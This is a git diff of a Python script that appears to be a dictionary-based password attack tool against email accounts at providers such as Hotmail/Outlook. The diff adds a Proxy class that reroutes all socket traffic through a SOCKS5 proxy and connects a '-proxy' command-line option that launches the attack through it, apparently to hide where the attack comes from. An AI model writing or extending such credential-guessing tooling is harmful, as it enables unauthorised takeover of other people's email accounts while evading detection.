@@ -1,5 +1,7 @@
 import subprocess
 import smtplib
+import socket
+import socks
 import time
 import sys
 
@@ -87,6 +89,7 @@ class Dictionary():
         self.__add_items_file(self.__filename, self.__list_generated_words)
 
         print(f"[+]Generated words added to file: {self.__filename}")
+
 class Email():
     def __init__(self, ip:str, usr:str, psw:str):
         self.__ip_server = {"hotmail":"outlook.office365.com", 
@@ -169,7 +172,18 @@ class Email():
         self.__end = time.time()        
 
         print(f"[+]Time elapsed: {self.__end - self.__start}s")
-        print(self.__msg)                
+        print(self.__msg)      
+
+class Proxy(Email):
+    def __init__(self, proxy:str, port: int, ip: str, usr: str, psw: str):
+        super().__init__(ip, usr, psw)
+
+        self.__proxy = proxy
+        self.__port = port
+
+    def start_proxy(self):
+        socks.set_default_proxy(socks.SOCKS5, self.__proxy, self.__port)
+        socket.socket = socks.socksocket          
         
 def main():
     if(sys.argv[1] == "-list" and sys.argv[3] == "-add"):
@@ -182,7 +196,9 @@ def main():
     elif(sys.argv[1] == "-proxy" and sys.argv[3] == "port" and
          sys.argv[5] == "-ip" and sys.argv[7] == "-usr" and
          sys.argv[9] == "-psw"):
-        pass
+        email_proxy = Proxy(sys.argv[2], int(sys.argv[4]), sys.argv[6], sys.argv[8], sys.argv[10])
+        email_proxy.start_proxy()
+        email_proxy.start_attack()
     else:
         print("\n[-]The selected option could not be identified.")
         print(menu)
